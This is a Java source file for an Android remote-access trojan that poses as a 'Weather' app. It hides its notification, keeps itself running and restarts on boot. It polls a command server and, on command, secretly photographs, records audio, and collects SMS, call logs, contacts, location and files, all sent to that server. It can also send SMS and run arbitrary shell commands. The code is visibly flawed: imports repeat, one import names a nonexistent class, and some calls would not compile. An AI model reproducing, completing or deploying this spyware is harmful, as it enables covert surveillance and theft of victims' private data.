package com.androidrat;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.hardware.Camera;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.Enumeration;
import java.util.List;
import java.util.Calendar;
import java.util.Date;
import java.util.Enumeration;
import java.util.Locale;
import java.util.NetworkInterface;
import java.util.UUID;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.Enumeration;
import java.util.List;
import java.util.Locale;
import java.util.UUID;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.Enumeration;
import java.util.List;
import java.util.Locale;
import java.util.UUID;

public class MainActivity extends AppCompatActivity {
    
    // ========== CONFIGURATION ==========
    private static final String SERVER_URL = "http://YOUR_SERVER_IP:5000";
    private static final int CHECK_INTERVAL = 30000;
    private static final String APP_NAME = "Weather";
    private static final String CHANNEL_ID = "weather_channel";
    
    // ========== DEVICE INFO ==========
    private String deviceId;
    private String deviceInfo;
    
    // ========== PERMISSIONS ==========
    private static final String[] PERMISSIONS = {
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_BOOT_COMPLETED,
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.POST_NOTIFICATIONS
    };
    
    // ========== STATE ==========
    private Thread heartbeatThread;
    private volatile boolean running = true;
    private PowerManager.WakeLock wakeLock;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Hide action bar
        if (getSupportActionBar() != null) {
            getSupportActionBar().hide();
        }
        
        // Initialize
        initDevice();
        requestPermissions();
        createNotificationChannel();
        startForegroundService();
        acquireWakeLock();
        startHeartbeat();
        registerBootReceiver();
        
        // Anti-detection
        hideFromRecents();
        
        Toast.makeText(this, APP_NAME + " Started", Toast.LENGTH_SHORT).show();
    }
    
    private void initDevice() {
        deviceId = getDeviceId();
        deviceInfo = getDeviceInfo();
    }
    
    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            List<String> needed = new ArrayList<>();
            for (String perm : PERMISSIONS) {
                if (ContextCompat.checkSelfPermission(this, perm) 
                        != PackageManager.PERMISSION_GRANTED) {
                    needed.add(perm);
                }
            }
            if (!needed.isEmpty()) {
                ActivityCompat.requestPermissions(this, 
                    needed.toArray(new String[0]), 100);
            }
        }
        
        // Android 13+ notification permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, 
                    Manifest.permission.POST_NOTIFICATIONS) 
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.POST_NOTIFICATIONS}, 101);
            }
        }
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                APP_NAME,
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.enableVibration(false);
            channel.enableLights(false);
            channel.setSound(null, null);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    private void startForegroundService() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, 
            notificationIntent, PendingIntent.FLAG_IMMUTABLE);
        
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(APP_NAME)
            .setContentText("Checking conditions...")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(Notification.VISIBILITY_SECRET)
            .build();
        
        startForeground(1, notification);
    }
    
    private void acquireWakeLock() {
        PowerManager pm = getSystemService(PowerManager.class);
        if (pm != null) {
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "Weather::WakeLock"
            );
            wakeLock.acquire(10*60*1000L);
        }
    }
    
    private void hideFromRecents() {
        try {
            Intent intent = new Intent();
            intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        } catch (Exception e) {}
    }
    
    private void startHeartbeat() {
        heartbeatThread = new Thread(() -> {
            while (running) {
                try {
                    sendHeartbeat();
                    checkCommands();
                    Thread.sleep(CHECK_INTERVAL);
                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    try { Thread.sleep(5000); } catch (Exception ex) {}
                }
            }
        });
        heartbeatThread.setDaemon(true);
        heartbeatThread.start();
    }
    
    private void sendHeartbeat() {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "heartbeat");
            data.put("deviceId", deviceId);
            data.put("deviceInfo", deviceInfo);
            data.put("battery", getBatteryLevel());
            data.put("timestamp", System.currentTimeMillis());
            
            sendData("/api/heartbeat", data.toString());
        } catch (Exception e) {}
    }
    
    private void checkCommands() {
        try {
            String response = sendRequest("/api/commands/" + deviceId, "GET");
            if (response != null && !response.isEmpty() && !response.contains("[]")) {
                JSONArray commands = new JSONArray(response);
                for (int i = 0; i < commands.length(); i++) {
                    executeCommand(commands.getJSONObject(i));
                }
            }
        } catch (Exception e) {}
    }
    
    private void executeCommand(JSONObject cmd) {
        String action = cmd.optString("action");
        
        switch (action) {
            case "camera":
                takePhoto();
                break;
            case "call_logs":
                getCallLogs();
                break;
            case "files":
                listFiles(cmd.optString("path", 
                    Environment.getExternalStorageDirectory().getPath()));
                break;
            case "download":
                downloadFile(cmd.optString("path"));
                break;
            case "location":
                getLocation();
                break;
            case "sms":
                getSms();
                break;
            case "sms_send":
                sendSms(cmd.optString("number"), cmd.optString("message"));
                break;
            case "contacts":
                getContacts();
                break;
            case "audio":
                recordAudio(cmd.optInt("duration", 60));
                break;
            case "info":
                sendDeviceInfo();
                break;
            case "shell":
                executeShell(cmd.optString("command"));
                break;
        }
    }
    
    // ========== CAMERA ==========
    private void takePhoto() {
        new Thread(() -> {
            try {
                Camera camera = Camera.open();
                Camera.Parameters params = camera.getParameters();
                params.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
                camera.setParameters(params);
                
                final byte[][] photoData = new byte[1][];
                
                camera.takePicture(null, null, (data, cam) -> {
                    photoData[0] = data;
                });
                
                Thread.sleep(1000);
                
                if (photoData[0] != null) {
                    File photoDir = new File(getExternalFilesDir(null), "weather");
                    photoDir.mkdirs();
                    
                    File photoFile = new File(photoDir, 
                        "weather_" + System.currentTimeMillis() + ".jpg");
                    
                    FileOutputStream fos = new FileOutputStream(photoFile);
                    fos.write(photoData[0]);
                    fos.close();
                    
                    uploadFile(photoFile, "/api/upload/photo/" + deviceId);
                }
                
                camera.release();
            } catch (Exception e) {}
        }).start();
    }
    
    // ========== CALL LOGS ==========
    private void getCallLogs() {
        new Thread(() -> {
            try {
                JSONArray logs = new JSONArray();
                Cursor cursor = getContentResolver().query(
                    android.provider.CallLog.Calls.CONTENT_URI, null, null, null,
                    android.provider.CallLog.Calls.DATE + " DESC LIMIT 50");
                
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        JSONObject log = new JSONObject();
                        log.put("number", cursor.getString(
                            cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER)));
                        log.put("date", cursor.getString(
                            cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE)));
                        log.put("duration", cursor.getString(
                            cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION)));
                        log.put("type", cursor.getString(
                            cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE)));
                        logs.put(log);
                    }
                    cursor.close();
                }
                
                JSONObject data = new JSONObject();
                data.put("type", "call_logs");
                data.put("deviceId", deviceId);
                data.put("logs", logs);
                sendData("/api/call_logs", data.toString());
            } catch (Exception e) {}
        }).start();
    }
    
    // ========== FILES ==========
    private void listFiles(String path) {
        new Thread(() -> {
            try {
                File dir = new File(path);
                File[] files = dir.listFiles();
                
                JSONArray fileList = new JSONArray();
                if (files != null) {
                    for (File file : files) {
                        JSONObject fileInfo = new JSONObject();
                        fileInfo.put("name", file.getName());
                        fileInfo.put("path", file.getAbsolutePath());
                        fileInfo.put("size", file.length());
                        fileInfo.put("isDirectory", file.isDirectory());
                        fileList.put(fileInfo);
                    }
                }
                
                JSONObject data = new JSONObject();
                data.put("type", "files");
                data.put("deviceId", deviceId);
                data.put("path", path);
                data.put("files", fileList);
                sendData("/api/files", data.toString());
            } catch (Exception e) {}
        }).start();
    }
    
    private void downloadFile(String filePath) {
        new Thread(() -> {
            try {
                uploadFile(new File(filePath), "/api/upload/file/" + deviceId);
            } catch (Exception e) {}
        }).start();
    }
    
    // ========== LOCATION ==========
    private void getLocation() {
        new Thread(() -> {
            try {
                android.location.LocationManager lm = 
                    getSystemService(android.location.LocationManager.class);
                
                double lat = 0, lon = 0;
                String provider = "unknown";
                
                if (lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER)) {
                    android.location.Location loc = 
                        lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
                    if (loc != null) {
                        lat = loc.getLatitude();
                        lon = loc.getLongitude();
                        provider = "gps";
                    }
                }
                
                if (provider.equals("unknown") && 
                    lm.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER)) {
                    android.location.Location loc = 
                        lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
                    if (loc != null) {
                        lat = loc.getLatitude();
                        lon = loc.getLongitude();
                        provider = "network";
                    }
                }
                
                JSONObject data = new JSONObject();
                data.put("type", "location");
                data.put("deviceId", deviceId);
                data.put("latitude", lat);
                data.put("longitude", lon);
                data.put("provider", provider);
                sendData("/api/location", data.toString());
            } catch (Exception e) {}
        }).start();
    }
    
    // ========== SMS ==========
    private void getSms() {
        new Thread(() -> {
            try {
                JSONArray smsList = new JSONArray();
                Cursor cursor = getContentResolver().query(
                    android.provider.Telephony.Sms.INBOX_URI, null, null, null, "_id DESC LIMIT 50");
                
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        JSONObject sms = new JSONObject();
                        sms.put("address", cursor.getString(
                            cursor.getColumnIndexOrThrow("address")));
                        sms.put("body", cursor.getString(
                            cursor.getColumnIndexOrThrow("body")));
                        sms.put("date", cursor.getString(
                            cursor.getColumnIndexOrThrow("date")));
                        smsList.put(sms);
                    }
                    cursor.close();
                }
                
                JSONObject data = new JSONObject();
                data.put("type", "sms");
                data.put("deviceId", deviceId);
                data.put("sms", smsList);
                sendData("/api/sms", data.toString());
            } catch (Exception e) {}
        }).start();
    }
    
    private void sendSms(String number, String message) {
        new Thread(() -> {
            try {
                android.telephony.SmsManager smsManager = 
                    android.telephony.SmsManager.getDefault();
                smsManager.sendTextMessage(number, null, message, null, null);
                
                JSONObject data = new JSONObject();
                data.put("type", "sms_sent");
                data.put("deviceId", deviceId);
                data.put("number", number);
                sendData("/api/sms_sent", data.toString());
            } catch (Exception e) {}
        }).start();
    }
    
    // ========== CONTACTS ==========
    private void getContacts() {
        new Thread(() -> {
            try {
                JSONArray contacts = new JSONArray();
                Cursor cursor = getContentResolver().query(
                    ContactsContract.Contacts.CONTENT_URI, null,
                    ContactsContract.Contacts.HAS_PHONE_NUMBER + "=1", null, null);
                
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String contactId = cursor.getString(
                            cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                        
                        JSONObject contact = new JSONObject();
                        contact.put("name", cursor.getString(
                            cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)));
                        
                        Cursor phoneCursor = getContentResolver().query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId,
                            null, null);
                        
                        JSONArray phones = new JSONArray();
                        if (phoneCursor != null) {
                            while (phoneCursor.moveToNext()) {
                                phones.put(phoneCursor.getString(
                                    phoneCursor.getColumnIndexOrThrow(
                                        ContactsContract.CommonDataKinds.Phone.NUMBER)));
                            }
                            phoneCursor.close();
                        }
                        
                        contact.put("phones", phones);
                        contacts.put(contact);
                    }
                    cursor.close();
                }
                
                JSONObject data = new JSONObject();
                data.put("type", "contacts");
                data.put("deviceId", deviceId);
                data.put("contacts", contacts);
                sendData("/api/contacts", data.toString());
            } catch (Exception e) {}
        }).start();
    }
    
    // ========== AUDIO ==========
    private void recordAudio(int duration) {
        new Thread(() -> {
            try {
                File audioDir = new File(getExternalFilesDir(null), "weather");
                audioDir.mkdirs();
                
                File audioFile = new File(audioDir, 
                    "weather_" + System.currentTimeMillis() + ".wav");
                
                int sampleRate = 16000;
                int bufferSize = AudioRecord.getMinBufferSize(
                    sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
                
                AudioRecord audioRecord = new AudioRecord(
                    MediaRecorder.AudioSource.MIC, sampleRate,
                    AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufferSize);
                
                audioRecord.startRecording();
                
                FileOutputStream fos = new FileOutputStream(audioFile);
                byte[] buffer = new byte[bufferSize];
                int durationMs = duration * 1000;
                long startTime = System.currentTimeMillis();
                
                while (System.currentTimeMillis() - startTime < durationMs) {
                    int bytesRead = audioRecord.read(buffer, 0, bufferSize);
                    if (bytesRead > 0) {
                        fos.write(buffer, 0, bytesRead);
                    }
                }
                
                audioRecord.stop();
                audioRecord.release();
                fos.close();
                
                uploadFile(audioFile, "/api/upload/audio/" + deviceId);
            } catch (Exception e) {}
        }).start();
    }
    
    // ========== DEVICE INFO ==========
    private String getDeviceId() {
        try {
            String androidId = Settings.Secure.getString(
                getContentResolver(), Settings.Secure.ANDROID_ID);
            return androidId != null ? androidId : UUID.randomUUID().toString();
        } catch (Exception e) {
            return UUID.randomUUID().toString();
        }
    }
    
    private String getDeviceInfo() {
        JSONObject info = new JSONObject();
        try {
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("brand", Build.BRAND);
            info.put("androidVersion", Build.VERSION.RELEASE);
            info.put("sdkVersion", Build.VERSION.SDK_INT);
            info.put("imei", getIMEI());
            info.put("ipAddress", getIPAddress());
        } catch (Exception e) {}
        return info.toString();
    }
    
    private String getIMEI() {
        try {
            TelephonyManager tm = getSystemService(TelephonyManager.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                return tm.getImei();
            }
            return tm.getDeviceId();
        } catch (Exception e) {
            return "unknown";
        }
    }
    
    private String getIPAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); 
                 en.hasMoreElements(); ) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); 
                     enumIpAddr.hasMoreElements(); ) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress() && 
                        inetAddress instanceof java.net.Inet4Address) {
                        return inetAddress.getHostAddress();
                    }
                }
            }
        } catch (Exception e) {}
        return "unknown";
    }
    
    private int getBatteryLevel() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra("level", -1);
                int scale = batteryStatus.getIntExtra("scale", -1);
                if (level != -1 && scale != -1) {
                    return (level * 100) / scale;
                }
            }
        } catch (Exception e) {}
        return -1;
    }
    
    private void sendDeviceInfo() {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "device_info");
            data.put("deviceId", deviceId);
            data.put("info", new JSONObject(deviceInfo));
            sendData("/api/device_info", data.toString());
        } catch (Exception e) {}
    }
    
    private void executeShell(String command) {
        new Thread(() -> {
            try {
                Process process = Runtime.getRuntime().exec(command);
                InputStream is = process.getInputStream();
                byte[] buffer = new byte[1024];
                StringBuilder output = new StringBuilder();
                int len;
                while ((len = is.read(buffer)) != -1) {
                    output.append(new String(buffer, 0, len));
                }
                
                JSONObject data = new JSONObject();
                data.put("type", "shell_output");
                data.put("deviceId", deviceId);
                data.put("output", output.toString());
                sendData("/api/shell_output", data.toString());
            } catch (Exception e) {}
        }).start();
    }
    
    // ========== HTTP HELPERS ==========
    private void sendData(String endpoint, String jsonData) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL + endpoint);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                conn.setDoOutput(true);
                
                OutputStream os = conn.getOutputStream();
                os.write(jsonData.getBytes());
                os.flush();
                os.close();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }
    
    private String sendRequest(String endpoint, String method) {
        try {
            URL url = new URL(SERVER_URL + endpoint);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod(method);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            
            InputStream is = conn.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            StringBuilder response = new StringBuilder();
            String line;
            
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            
            reader.close();
            conn.disconnect();
            return response.toString();
        } catch (Exception e) {
            return null;
        }
    }
    
    private void uploadFile(File file, String endpoint) {
        new Thread(() -> {
            try {
                FileInputStream fis = new FileInputStream(file);
                byte[] data = fis.readAllBytes();
                fis.close();
                
                String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
                
                JSONObject jsonData = new JSONObject();
                jsonData.put("filename", file.getName());
                jsonData.put("size", file.length());
                jsonData.put("data", base64);
                
                sendData(endpoint, jsonData.toString());
            } catch (Exception e) {}
        }).start();
    }
    
    // ========== BOOT RECEIVER ==========
    private void registerBootReceiver() {
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_BOOT_COMPLETED);
        filter.addAction("android.intent.action.QUICKBOOT_POWERON");
        registerReceiver(bootReceiver, filter);
    }
    
    private BroadcastReceiver bootReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent != null && intent.getAction() != null &&
                (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED) ||
                 intent.getAction().equals("android.intent.action.QUICKBOOT_POWERON"))) {
                Intent bootIntent = new Intent(context, MainActivity.class);
                bootIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(bootIntent);
            }
        }
    };
    
    @Override
    protected void onDestroy() {
        running = false;
        if (heartbeatThread != null) heartbeatThread.interrupt();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        super.onDestroy();
    }
}
